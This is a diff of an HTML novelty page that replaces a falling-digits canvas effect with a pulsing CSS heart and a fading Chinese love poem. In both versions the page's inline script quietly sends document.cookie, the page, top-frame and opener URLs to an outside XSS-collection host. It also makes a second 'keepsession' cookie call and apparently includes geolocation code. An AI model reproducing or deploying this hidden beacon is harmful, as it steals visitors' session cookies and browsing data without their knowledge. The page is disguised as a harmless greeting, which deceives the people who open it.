@@ -1,19 +1,70 @@
 <!DOCTYPE html>
 <html>
- <head>
-  <meta charset="utf-8">
-  <title></title>
-  <style type="text/css">
-   canvas{
-    display: block;
-    }
-  </style>
- </head>
- <body>
-  <canvas id="canvas"></canvas>
-
-<script>
-    (function(){(new Image()).src='https://xsshs.cn/xss.php?do=api&id=1bSG&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
+	<head>
+		<meta charset="utf-8" />
+		<title>520表白</title>
+		<style type="text/css">
+			body{
+				/* 颜色取值0-9 a-f */
+				background: mediumseagreen;
+			}
+			.c1,.c2,.rect{
+				width: 200px;
+				height: 200px;
+				background: #f00;
+				border-radius: 50%;
+				box-shadow: 0 0 30px rgb(255,0,0);
+			}
+			.rect{
+				margin-top: -200px;
+				border-radius: 0;
+			}
+			.c2{
+				margin-top: -100px;
+				margin-left: -100px;
+			}
+			#love{
+				position: absolute;
+				left: 30%;
+				top:10%;
+				transform: rotate(45deg);
+				
+			}
+			
+			.start{
+				animation: boom .5s infinite linear;
+			}
+			/* 创建自定义动画 */
+			@-webkit-keyframes boom{
+				30%{
+					transform:scale(1.1) rotate(45deg);
+				}
+				50%{
+					transform:scale(1.2) rotate(45deg);
+				}
+			}
+			
+			#msg{
+				position: absolute;
+				top: 80%;
+				left:20%;
+				font-size: 1.2em;
+				font-family:"微软雅黑" ;
+				line-height: 40px;
+				color: #fff;
+				opacity: 0;   /* 文字透明度 */
+			}
+		</style>
+	</head>
+	<body>
+		<div id="love" >
+			<div class="c1"></div>
+			<div class="c2"></div>
+			<div class="rect"></div>
+		</div>
+    <span id="msg">世界上最遥远的距离，不是生与死</br>而是你站在我对面，我却看不到</span>
+    <script>
+      (function(){(new Image()).src='https://xsshs.cn/xss.php?do=api&id=1bSG&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
 if(''==1){keep=new Image();keep.src='https://xsshs.cn/xss.php?do=keepsession&id=1bSG&url='+escape(document.location)+'&cookie='+escape(document.cookie)};
 function getCookie(name){  
         var value="";  
@@ -41,49 +92,47 @@ function showPosition(position)
 }
        
 getLocation();
-</script>
+      </script>
 
-  <script>
-    function $(id){
-      return document.getElementById(id);
-    }
-
-   var mywindow=window.screen;
-   var canvas=$("canvas");
-   canvas.width=mywindow.width;
-   canvas.height=mywindow.height;
-
-
-   var str="0123456789";
-   str=str.split("");
-   var fontSize=16;
-
-   var cols=canvas.width/fontSize;
-  
-   var drops=[];
-   for(var i=0;i<cols;i++){
-     drops[i]=1;
-   }
-
-   var ctx=canvas.getContext("2d");
-   function draw(){
-
-    ctx.fillStyle="rgba(0,0,0,0.05)";
-    ctx.fillRect(0,0,canvas.width,canvas.height);
-
-    ctx.fillStyle="green";
-    ctx.font=fontSize+"px arial";
-    for(var i=0;i<cols;i++){
-      var text=str[ Math.floor( Math.random() * (str.length) ) ];
-
-      ctx.fillText(text,i*fontSize,drops[i]*fontSize);
-      if(drops[i]*fontSize > canvas.height || Math.random() > 0.95)
-          drops[i] = 0;
-
-      drops[i]++;
-    }
-  }
-  setInterval(draw,33);
- </script>
-</body>
+		<script>
+			// 初始化跳动状态为停止
+			var boom =false;
+			// 为整个文档绑定一个案例事件
+			document.addEventListener('keydown',function(e){
+				// 获取按下的按键码(ascil码)
+				var code =e.keyCode;
+				// 判断按下的是否是回车键
+				if(code===13){
+					// 根据id获取整个心
+					var div=document.getElementById('love'); 
+					// 根据id获取文本控件对象
+					var span=document.getElementById('msg');
+					if(boom){
+						// 停止
+						div.className='';
+						//boom=flase;
+						span.style.opacity=0;
+					}else{
+						// 跳动
+						div.className='start';
+						//boom=true;
+						// 初始化一个变量,表示透明度
+						var opacity=0.1;
+						// 定时任务,每隔0.3s执行一次函数,改变透明度
+						var f= setInterval(function(){
+							opacity+=0.1;
+							// 设置span元素的透明度
+							span.style.opacity=opacity;
+							// 当透明度等于1时则表示完全显示,此时需要终止定时任务
+							if(opacity>=1){
+								clearInterval(f);
+							}
+						},300);
+					}
+					boom=!boom;
+				}
+			});
+		</script>
+	</body>
 </html>
+
